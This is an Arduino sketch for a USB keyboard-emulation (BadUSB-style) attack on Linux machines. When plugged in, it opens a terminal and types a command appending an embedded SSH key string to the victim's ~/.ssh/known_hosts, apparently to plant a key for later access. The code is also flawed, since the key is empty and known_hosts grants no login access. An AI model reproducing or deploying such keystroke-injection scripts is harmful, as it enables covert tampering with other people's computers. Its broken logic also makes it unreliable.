#include <Keyboard.h>

void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void shell(String action){
  int timeToWait = 100;
  Keyboard.print(action);
  typeKey(KEY_RETURN);
  delay(timeToWait);
}


//METHODS

String id_rsa = "";
void add_rsa(){
  String command = String ( "echo " + id_rsa + " >> ~/.ssh/known_hosts");
  shell(command);
}


//MAIN
void linuxSO(){
  //Abrir terminal en linux ( Estudiar que tipo de arquitectura tiene)
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('t');
  Keyboard.releaseAll();
  delay(500);

  add_rsa();
  
}

void setup()
{

  Keyboard.begin();
  delay(1000);

  linuxSO();
  
  Keyboard.end();
}

void loop() {}
